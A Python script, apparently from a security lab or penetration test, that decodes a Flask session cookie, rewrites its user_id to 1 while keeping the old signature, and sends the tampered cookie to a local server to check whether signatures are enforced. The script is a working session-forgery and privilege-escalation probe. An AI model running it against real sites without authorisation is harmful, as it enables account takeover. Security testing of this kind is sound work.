import requests
import base64
import json
import urllib.parse

session_cookie = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"

print(f"Raw session cookie: {session_cookie}")
print()

# Split the session cookie
parts = session_cookie.split('.')
if len(parts) != 3:
    print(f"Error: Expected 3 parts, got {len(parts)}")
else:
    payload_b64, timestamp, signature = parts
    print(f"[+] Cookie structure valid (3 parts found)")
    print(f"  - Payload (base64): {payload_b64}")
    print(f"  - Timestamp: {timestamp}")
    print(f"  - Signature: {signature}")
    print()
    
    # Decode payload
    try:
        # Flask uses base64.urlsafe_b64encode without padding
        # We need to add padding to make it valid for decoding
        missing_padding = len(payload_b64) % 4
        if missing_padding:
            payload_b64_padded = payload_b64 + ('=' * (4 - missing_padding))
            print(f"  Added {4 - missing_padding} padding characters")
        else:
            payload_b64_padded = payload_b64
        
        payload_decoded = base64.urlsafe_b64decode(payload_b64_padded)
        print(f"Decoded payload bytes: {payload_decoded}")
        
        payload_str = payload_decoded.decode('utf-8')
        print(f"Decoded payload string: {payload_str}")
        
        # Parse as JSON
        payload_json = json.loads(payload_str)
        print(f"Final JSON session data: {json.dumps(payload_json, indent=2)}")
        print()
        
        # Analyze signature
        print("[!] Signature validation analysis:")
        print(f"  - Signature present: {len(signature) > 0}")
        print(f"  - Signature length: {len(signature)} characters")
        print(f"  - Looks like Flask signed cookie (HMAC-SHA256)")
        print()
        
        # Try to test session tampering
        print("[*] Testing session tampering...")
        try:
            # Original session
            headers = {'Cookie': f'session={session_cookie}'}
            original_resp = requests.get('http://127.0.0.1:33198/', headers=headers, timeout=5)
            print(f"  Original session: Status {original_resp.status_code}, Length {len(original_resp.text)}B")
            
            # Create modified payload (change user_id to 1)
            if 'user_id' in payload_json:
                modified_payload = payload_json.copy()
                modified_payload['user_id'] = 1
                modified_payload_str = json.dumps(modified_payload, separators=(',', ':'))
                
                # Re-encode (without padding like Flask does)
                modified_payload_b64 = base64.urlsafe_b64encode(
                    modified_payload_str.encode('utf-8')
                ).decode('utf-8').rstrip('=')
                
                # Create tampered cookie (without valid signature)
                tampered_cookie = f"{modified_payload_b64}.{timestamp}.{signature}"
                
                print(f"  Modified payload: {modified_payload_str}")
                print(f"  Modified b64: {modified_payload_b64}")
                print(f"  Tampered cookie: {tampered_cookie}")
                
                # Test tampered session
                headers_tampered = {'Cookie': f'session={tampered_cookie}'}
                tampered_resp = requests.get('http://127.0.0.1:33198/', headers=headers_tampered, timeout=5)
                print(f"  Tampered session (same signature): Status {tampered_resp.status_code}, Length {len(tampered_resp.text)}B")
                
                if tampered_resp.status_code == 200 and len(tampered_resp.text) == len(original_resp.text):
                    print("  [!] WARNING: Server accepted tampered cookie - NO signature validation!")
                else:
                    print("  [+] Good: Server likely validates signatures (different response)")
                    
        except Exception as test_error:
            print(f"  Error testing tampering: {test_error}")
            
    except Exception as decode_error:
        print(f"Error decoding payload: {decode_error}")
